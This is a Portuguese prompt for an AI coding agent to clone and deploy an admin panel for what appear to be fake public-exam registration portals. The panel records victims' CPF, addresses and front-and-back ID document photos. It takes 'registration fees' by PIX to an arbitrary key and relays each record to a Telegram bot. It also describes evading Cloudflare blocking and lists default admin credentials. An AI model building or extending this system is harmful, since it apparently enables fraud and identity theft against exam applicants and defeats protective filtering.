# PROMPT PARA NOVO AGENTE — Reaproveitar Painel Administrativo Existente

Copie e cole este prompt inteiro no novo agente Emergent. Ele contém tudo o que ele precisa saber para clonar, integrar e reutilizar o painel administrativo já pronto.

---

## 📋 PROMPT — COPIAR A PARTIR DAQUI:

---

Olá! Eu tenho um projeto anterior com um **painel administrativo já pronto e funcional** que eu quero reaproveitar neste novo projeto. Você **NÃO precisa reconstruir o painel do zero** — apenas clonar do meu repositório GitHub e conectar ao novo backend.

### 🔗 Repositório GitHub base
```
https://github.com/carlinnoa874-blip/meuprojectorsalvar-pp-riograndedonorte-002
```

### 🎯 O que quero neste novo projeto
Preciso construir um **[DESCREVA AQUI O NOVO PROJETO — Ex: "portal de inscrições para o concurso da Polícia Militar de SP", "sistema de cadastro de leads para um curso online" etc]**, mas **reaproveitando 100% o painel administrativo** do repositório acima.

---

## 🗂️ Arquitetura do Painel Administrativo (Já Pronto)

### Stack
- **Backend**: FastAPI (Python 3.11) — porta interna 8001
- **Painel Admin (frontend)**: React CRA **já compilado**, servido estático em `/app/frontend/public/donaspainel/`
- **Banco de dados**: MongoDB
- **Autenticação Admin**: JWT + bcrypt (login/senha)

### Rotas de acesso ao painel
- `/donaspainel` — painel principal
- `/farpapainel` — alias alternativo (aponta pro mesmo React SPA)
- `/donaspainel/documentos` → `donaspainel-documentos.html` (baixar ZIPs de docs)

---

## 📄 O que o Painel Administrativo Contém

### 1. Dashboard (Home)
- **Cards de KPI ao vivo**:
  - Acessos únicos (contador de visitantes)
  - Total de inscrições
  - Valor total gerado (soma dos valores das inscrições)
  - PIX gerados
  - PIX copiados
  - PIX baixados (comprovantes)
- **Feed em tempo real** (últimos 50 eventos): novos acessos mobile/desktop, novas inscrições, cadastros iniciados
- Botão **Zerar KPIs**
- Botão **Atualizar**

### 2. Aba Cadastros
- Lista candidatos que iniciaram o formulário (não terminaram ainda)
- Pesquisa por nome/CPF/e-mail
- Exportação `.txt`
- Botão **Limpar Cadastros** (deleta tudo: cadastros + inscrições + docs + PIX)

### 3. Aba Inscrições
- Lista completa de candidatos que **finalizaram** a inscrição
- Colunas: Nome, CPF, Dispositivo (Mobile/Desktop), Valor, Status (PIX gerado / copiado / baixado), Data
- Ícone **Exibir** (abre modal com dados completos)
- Ícone **Deletar** (candidato individual)
- Filtro por status
- Pesquisa por nome/CPF/e-mail/nº referência
- Botão **Baixar Dados** (exportação)
- Botão **Limpar Inscrições**

### 4. Aba Documentos
- Lista candidatos que **anexaram foto de RG/CNH/CIN/Passaporte** (frente e verso)
- Preview de "Frente ✓ Verso ✓"
- Botão **Baixar ZIP** por candidato (recebe as duas imagens em ZIP)
- Botão **Baixar todos** (ZIP mestre)

### 5. Aba Configurações
- **PIX**:
  - Chave PIX (CPF, e-mail, telefone ou aleatória)
  - Nome do beneficiário
  - Cidade
- **Telegram**:
  - Toggle ativar/desativar notificações
  - Bot Token
  - Chat ID (grupo ou pessoal)
  - Título das mensagens (ex: "Portal Concurso XYZ")
  - Botão **Testar conexão** (envia mensagem de teste)
- **Admin**: Alterar senha do usuário atual

### 6. Login Admin
- Rota: `/donaspainel/login` (usuário e senha)
- Autenticação via JWT com expiração
- Brute force protection (após 5 tentativas erradas: bloqueia por 15min)

---

## 🔌 API Endpoints do Backend (já implementados)

Todos os endpoints ficam em `/app/backend/admin_routes.py`. Prefixo obrigatório: `/api`.

### Tracking Público (sem autenticação — chamados pelo frontend público)
- `POST /api/track/access` — registra um acesso ao site (mobile ou desktop, com geoIP)
- `POST /api/track/registration` — registra/atualiza um cadastro ou inscrição finalizada
- `POST /api/track/documents` — envia fotos base64 do documento (frente/verso) — **endpoint separado pra evitar bloqueio do Cloudflare em POSTs grandes**
- `POST /api/track/pix-generated` — usuário chegou na tela do QR PIX
- `POST /api/track/pix-copied` — usuário clicou "Copiar código PIX"
- `POST /api/track/pix-downloaded` — usuário imprimiu/baixou o comprovante

### PIX
- `GET /api/pix/qr.png` — gera imagem QR PNG do PIX (query params: `?valor=130.00&txid=XYZ`)
- `GET /api/pix/code.txt` — retorna o código EMV BACEN "copia-e-cola" em texto

### Admin (protegidos com JWT)
- `POST /api/admin/auth/login` — login (retorna token JWT)
- `GET /api/admin/dashboard/kpis` — todos os KPIs
- `GET /api/admin/dashboard/realtime?limit=50` — feed em tempo real
- `POST /api/admin/dashboard/reset-kpis` — zerar contadores
- `GET /api/admin/cadastros?q=&limit=100` — lista cadastros
- `GET /api/admin/cadastros/export.txt?q=` — exportar
- `POST /api/admin/cadastros/clear-all` — limpa TUDO (cadastros + inscrições + docs + eventos + PIX)
- `GET /api/admin/inscriptions?limit=10000&q=` — lista inscrições
- `POST /api/admin/inscriptions/clear-all` — idem clear-all
- `DELETE /api/admin/inscriptions/{id}` — deletar candidato
- `GET /api/admin/documentos` — lista candidatos com docs
- `POST /api/admin/documentos/download-zip` — gera ZIP dos docs
- `GET /api/admin/settings` — configurações PIX + Telegram
- `POST /api/admin/settings` — atualizar configurações
- `POST /api/admin/telegram/test` — testar bot Telegram

---

## 🗄️ Schema MongoDB (Coleções)

### `admins`
```json
{
  "username": "farpa",
  "password_hash": "$2b$12$...",
  "role": "admin"
}
```

### `settings` (documento único com _id="main")
```json
{
  "_id": "main",
  "pix_key": "email@dominio.com",
  "pix_nome": "INSTITUTO XYZ",
  "pix_cidade": "NATAL",
  "telegram_enabled": true,
  "telegram_bot_token": "1234:ABC...",
  "telegram_chat_id": "-1001234567",
  "telegram_titulo": "Portal Concurso XYZ"
}
```

### `cadastros`
```json
{
  "cpf": "12345678900",
  "nome": "JOÃO SILVA",
  "email": "joao@ex.com",
  "form_data": {
    "cpf": "...", "nome": "...", "rg": "...",
    "celular": "...", "endereco": "...", 
    "doc_tipo": "RG",
    "doc_frente": "data:image/jpeg;base64,...",
    "doc_verso": "data:image/jpeg;base64,..."
  },
  "created_at": "2026-01-30T10:00:00Z",
  "last_at": "2026-01-30T10:15:00Z"
}
```

### `inscricoes` (candidatos que finalizaram)
```json
{
  "cpf": "12345678900",
  "nome": "JOÃO SILVA",
  "cargo_codigo": "401",
  "cargo_titulo": "POLICIAL PENAL",
  "protocolo": "12345678900001",
  "valor": 130.0,
  "taxa": "R$ 130,00",
  "device": "mobile",
  "geo": {"cidade":"Natal","uf":"RN"},
  "pix_status": "gerado|copiado|baixado",
  "telegram_message_id": 5648,
  "telegram_sent_at": "...",
  "finalizado": true,
  "created_at": "..."
}
```

### `registrations`, `accesses`, `events`, `pix_generated`, `pix_copied`, `pix_downloaded`
Coleções auxiliares de tracking e histórico.

---

## 🔐 Credenciais padrão (TROCAR!)

- Usuário: `farpa`
- Senha: `Ads102030`

Após primeiro deploy, mudar imediatamente pela aba **Configurações → Admin**.

---

## 📥 Como você (novo agente) deve prosseguir

### PASSO 1 — Clonar o repositório base
```bash
cd /app
git init
git remote add origin https://github.com/carlinnoa874-blip/meuprojectorsalvar-pp-riograndedonorte-002.git
git fetch origin
git checkout -b main
git pull origin main
```

Ou (se preferir download direto):
```bash
cd /tmp && git clone https://github.com/carlinnoa874-blip/meuprojectorsalvar-pp-riograndedonorte-002.git
cp -R meuprojectorsalvar-pp-riograndedonorte-002/backend /app/
cp -R meuprojectorsalvar-pp-riograndedonorte-002/frontend/public/donaspainel /app/frontend/public/
cp meuprojectorsalvar-pp-riograndedonorte-002/frontend/public/donaspainel-documentos.html /app/frontend/public/
cp meuprojectorsalvar-pp-riograndedonorte-002/backend/admin_routes.py /app/backend/
cp meuprojectorsalvar-pp-riograndedonorte-002/backend/pix_generator.py /app/backend/
```

### PASSO 2 — Estrutura resultante
```
/app/
├── backend/
│   ├── server.py              ← FastAPI principal (importa admin_routes)
│   ├── admin_routes.py        ← TODAS as rotas /api/admin/* e /api/track/*
│   ├── pix_generator.py       ← Geração EMV/QR PIX
│   ├── requirements.txt
│   └── .env
├── frontend/
│   └── public/
│       ├── donaspainel/       ← React admin já compilado (NÃO recompile)
│       │   ├── index.html
│       │   └── static/
│       └── donaspainel-documentos.html
```

### PASSO 3 — Registrar as rotas no `server.py`
No `server.py` do backend, adicionar:
```python
from admin_routes import admin_router
app.include_router(admin_router, prefix="/api")
```

### PASSO 4 — Configurar variáveis de ambiente
`backend/.env`:
```
MONGO_URL="mongodb://localhost:27017"
DB_NAME="portal_prod"
CORS_ORIGINS="https://seudominio.com,https://www.seudominio.com"
```

`frontend/.env`:
```
REACT_APP_BACKEND_URL=https://seudominio.com
```

### PASSO 5 — Seed inicial (admin + settings)
```python
# script /tmp/seed.py
import asyncio, os
from motor.motor_asyncio import AsyncIOMotorClient
from passlib.context import CryptContext
from dotenv import load_dotenv
load_dotenv('/app/backend/.env')
pwd = CryptContext(schemes=['bcrypt'], deprecated='auto')

async def seed():
    c = AsyncIOMotorClient(os.environ['MONGO_URL'])
    db = c[os.environ['DB_NAME']]
    await db.admins.update_one(
        {'username':'admin'},
        {'$set':{'username':'admin','password_hash':pwd.hash('TrocarSenha!'),'role':'admin'}},
        upsert=True)
    await db.settings.update_one(
        {'_id':'main'},
        {'$set':{
            'pix_key':'sua-chave-pix',
            'pix_nome':'NOME BENEFICIARIO',
            'pix_cidade':'CIDADE',
            'telegram_enabled': False,
            'telegram_bot_token':'',
            'telegram_chat_id':'',
        }},
        upsert=True)
    print('OK')
asyncio.run(seed())
```

### PASSO 6 — Configurar rotas amigáveis no Nginx (se for para VPS) OU no proxy do preview

Ambas rotas apontam pro React SPA compilado:
- `/donaspainel` → `frontend/public/donaspainel/index.html`
- `/farpapainel` → mesmo destino
- `/donaspainel/documentos` → `frontend/public/donaspainel-documentos.html`

### PASSO 7 — Adaptar o frontend público ao seu novo projeto
O painel admin funciona com **qualquer frontend público** que envie tracking. Seu novo frontend só precisa fazer POST para:
- `/api/track/access` no primeiro carregamento
- `/api/track/registration` em cada mudança de etapa (com `finalized:true` quando concluir)
- `/api/track/documents` para enviar as fotos separadamente
- `/api/track/pix-generated` / `/api/track/pix-copied` / `/api/track/pix-downloaded` conforme necessidade

---

## ⚠️ ATENÇÃO — Regras importantes

1. **NÃO reescreva o painel admin** (o React em `donaspainel/`). Ele já está compilado e funcionando.
2. **NÃO altere `admin_routes.py`** a não ser que precise adicionar endpoints novos, específicos do seu projeto.
3. **Compressão de imagens obrigatória** no frontend antes de enviar `doc_frente`/`doc_verso`: max 500px, JPEG 40% qualidade. Sem isso, Cloudflare bloqueia o POST.
4. **Endpoint `/track/documents` é SEPARADO** de `/track/registration` para evitar payloads grandes que o proxy bloqueia (403 error 1010).
5. **PIX gerado localmente** via lib `qrcode` — não precisa integração com banco.
6. **Telegram é opcional** — se `telegram_enabled=false`, não dispara nada.

---

## 🧪 O que quero que você faça

1. Faça o clone/cópia dos arquivos do repositório base para este novo ambiente
2. Configure as variáveis de ambiente
3. Registre o `admin_router` no `server.py`
4. Faça o seed do admin
5. Configure as rotas `/donaspainel`, `/farpapainel` e `/api/*`
6. Depois, me perca aqui pra eu descrever o **frontend público** do meu novo projeto (o que muda em relação ao anterior)

Comece por confirmar o plano acima e me dizer que dados/configurações você precisa de mim (nome do concurso, valor da taxa, cargo, etc).

---

## 📎 FIM DO PROMPT
